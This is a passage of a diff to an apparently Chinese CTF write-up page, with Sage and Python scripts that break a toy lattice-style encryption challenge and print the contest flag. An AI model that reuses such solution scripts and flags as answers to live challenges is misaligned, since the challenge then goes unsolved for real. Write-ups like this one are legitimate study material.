 </span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="mi">31497596336552470100084187834926304075869321337353584228754801815485197854209104578876574798202880445492465226847681886628987815101276129299179423009194336979092146458547058477361338454307308727787100367492619524471399054846173175096003547542362283035506046981301967777510149938655352986115892410982908002343</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="mi">126982824744410328945797087760338772632266265605499464155168564006938381164343998332297867219509875837758518332737386292044402913405044815273140449332476472286262639891581209911570020757347401235079120185293696746139599783586620242086604902725583996821566303642800016358224555557587702599076109172899781757727</span>
@@ -710,14 +1320,35 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">f</span><span class="o">*</span><span class="n">c</span> <span class="o">%</span> <span class="n">p</span> <span class="o">%</span> <span class="n">g</span>
 </span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="n">a</span> <span class="o">*</span> <span class="n">inverse_mod</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">g</span><span class="p">)</span> <span class="o">%</span> <span class="n">g</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span></span></span></code></pre></div><p><img loading="lazy" src='https://i.loli.net/2020/05/16/3LrD1efsYIm8la7.png' alt="Screenshot_20200516_151456"></p>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src='https://i.loli.net/2020/05/16/3LrD1efsYIm8la7.png' alt="Screenshot_20200516_151456"></p>
 <p>最终<code>flag</code>: <code>minil{l1Ii5n0tea5y}</code></p>
 <h3 class="heading-element" id="fkbase"><span>f**k&amp;base</span>
  <a href="#fkbase" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>这道题就是上面那道的变种. 用<code>brainfuck</code>解密一下<code>source.txt</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sage" data-lang="sage"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sage" data-lang="sage"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">q</span><span class="o">=</span><span class="n">getPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">=</span><span class="n">getPrime</span><span class="p">(</span><span class="mi">511</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">g</span><span class="o">=</span><span class="n">getPrime</span><span class="p">(</span><span class="mi">511</span><span class="p">)</span>
@@ -731,8 +1362,26 @@
 </span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">f</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">g</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">q</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">e</span></span></span></code></pre></div><p>解密脚本:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># sage</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">e</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>解密脚本:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># sage</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="mi">172620634756442326936446284386446310176482010539257694929884002472846127607264743380697653537447369089693337723649017402105400257863085638725058903969478143249108126132543502414741890867122949021941524916405444824353100158506448429871964258931750339247018885114052623963451658829116065142400435131369957050799</span>
 </span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">130055004464808383851466991915980644718382040848563991873041960765504627910537316320531719771695727709826775790697704799143461018934672453482988811575574961674813001940313918329737944758875566038617074550624823884742484696611063406222986507537981571075140436761436815079809518206635499600341038593553079293254</span>
@@ -743,7 +1392,9 @@
 </span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">f</span><span class="o">*</span><span class="n">c</span> <span class="o">%</span> <span class="n">p</span> <span class="o">%</span> <span class="n">g</span>
 </span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="n">a</span> <span class="o">*</span> <span class="n">inverse_mod</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">g</span><span class="p">)</span> <span class="o">%</span> <span class="n">g</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># m = 629250774757584627131327668302148468</span></span></span></code></pre></div><p><img loading="lazy" src='https://i.loli.net/2020/05/16/IYO1iCHWFoQqVy3.png' alt="Screenshot_20200516_152308"></p>
+</span></span><span class="line"><span class="cl"><span class="c1"># m = 629250774757584627131327668302148468</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src='https://i.loli.net/2020/05/16/IYO1iCHWFoQqVy3.png' alt="Screenshot_20200516_152308"></p>
 <h2 class="heading-element" id="做题情况"><span>做题情况</span>
  <a href="#%e5%81%9a%e9%a2%98%e6%83%85%e5%86%b5" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
